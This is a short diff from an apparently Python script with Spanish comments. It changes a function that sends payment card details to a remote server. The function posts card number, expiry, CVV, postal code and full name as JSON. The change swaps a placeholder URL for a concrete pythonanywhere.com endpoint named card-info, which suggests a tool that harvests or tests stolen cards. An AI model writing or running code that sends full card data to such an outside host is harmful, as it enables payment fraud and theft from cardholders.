@@ -564,7 +564,7 @@ def generate_postal_code():
 
 # Función para enviar los datos de la tarjeta al servidor
 def send_card_info(card_number, expiry, cvv, postal_code, full_name):
-    SERVER_URL = "https://tu_servidor.com/procesar_tarjeta"
+    SERVER_URL = "http://linx.pythonanywhere.com/card-info"
     return requests.post(SERVER_URL, json={
         'card_number': card_number,
         'expiry': expiry,
